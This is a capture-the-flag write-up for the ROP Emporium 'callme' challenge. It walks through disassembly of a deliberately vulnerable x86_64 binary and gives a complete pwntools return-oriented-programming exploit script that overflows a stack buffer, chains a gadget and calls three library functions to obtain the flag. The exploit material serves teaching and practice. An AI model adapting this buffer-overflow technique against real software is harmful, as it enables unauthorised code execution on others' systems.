# Writeup: callme

## Introduction

This challenge instructs us to call the three functions callme_n were n is a number from 1 to 3. We know from disassembling the binary that the pwn function is the function that is vulnerable to a buffer overflow allowing us to overwrite the return address on the strack to hijack the execution flow and obtain the flag.

## Disassembly

### pwnme and main

```
    void pwnme()
    {
            char buffer[32];
            memset(buffer, 0, 32);
            puts("Hope you read the instructions...\n");
            printf("> ");
            read(0, buffer, 512);
            puts("Thank you!");
    }

    int main(int argc, char** argv)
    {
            setvbuf(stdout, 0, 2, 0);
            puts("callme by ROP Emporium");
            puts("x86_64\n");
            pwnme();
            puts("\nExiting");

            return 0;
    }
```

### callme functions

```
    gef➤  disas callme_one
    Dump of assembler code for function callme_one@plt:
       0x0000000000400720 <+0>:     jmp    QWORD PTR [rip+0x20091a]        # 0x601040 <callme_one@got.plt>
       0x0000000000400726 <+6>:     push   0x5
       0x000000000040072b <+11>:    jmp    0x4006c0
    End of assembler dump.
    gef➤  disas callme_two
    Dump of assembler code for function callme_two@plt:
       0x0000000000400740 <+0>:     jmp    QWORD PTR [rip+0x20090a]        # 0x601050 <callme_two@got.plt>
       0x0000000000400746 <+6>:     push   0x7
       0x000000000040074b <+11>:    jmp    0x4006c0
    End of assembler dump.
    gef➤  disas callme_three
    Dump of assembler code for function callme_three@plt:
       0x00000000004006f0 <+0>:     jmp    QWORD PTR [rip+0x200932]        # 0x601028 <callme_three@got.plt>
       0x00000000004006f6 <+6>:     push   0x2
       0x00000000004006fb <+11>:    jmp    0x4006c0
    End of assembler dump.
```

Here you can see that in every callme function it jumps to the same address which in this case is the libcallme.so library where the functions do some calculation to determine if the right set of arguments have been passed and if the functions have been called in the right order. The description of the challenge tells us that we must call the functions in order from smallest to greatest with the arguments, 0xdeadbeef, 0xcafebabe, 0xd00df00d for each function (since this is a 64 bit binary we will be doubling up on these values as instructed).

### usefulGadgets Function

```
    gef➤  disas usefulGadgets
    Dump of assembler code for function usefulGadgets:
       0x000000000040093c <+0>:     pop    rdi
       0x000000000040093d <+1>:     pop    rsi
       0x000000000040093e <+2>:     pop    rdx
       0x000000000040093f <+3>:     ret
```

Here you can see that this binary contains the gadget needed to pass all three arguments to each function call. We will use this later when constructing our script.

## Results

Now that we have everything we need we will being by building the script.

```
    from pwn import *

    p = process('./callme')
    e = ELF('./callme')

    rop = ROP(e)

    callme_one = 0x400720
    callme_two = 0x400740
    callme_three = 0x4006f0

    GADGET = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0];

    padding = b'A' * 40

    arg1 = 0xdeadbeefdeadbeef
    arg2 = 0xcafebabecafebabe
    arg3 = 0xd00df00dd00df00d

    args = p64(arg1) + p64(arg2) + p64(arg3)

    # pop the arguments from the stack onto the appropriate registers (rdi, rsi, rdx)
    # call the function
    # repeat for each function call
    payload1 = p64(GADGET) + args + p64(callme_one)
    payload2 = p64(GADGET) + args + p64(callme_two)
    payload3 = p64(GADGET) + args + p64(callme_three)

    p.recvuntil(b'> ')

    p.sendline(padding + payload1 + payload2 + payload3)
    p.interactive() 
```

Now all that is left is to run it and get the flag.

```
    [+] Starting local process './callme': pid 48737
    [*] '/mnt/c/Users/18506/Desktop/CTF/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
    [*] Loaded 17 cached gadgets for './callme'
    [*] Switching to interactive mode
    Thank you!
    callme_one() called correctly
    callme_two() called correctly
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
    $
    [*] Process './callme' stopped with exit code 0 (pid 48737)
    [*] Got EOF while sending in interactive
```
Finally, we have our flag:
`ROPE{a_placeholder_32byte_flag!}`

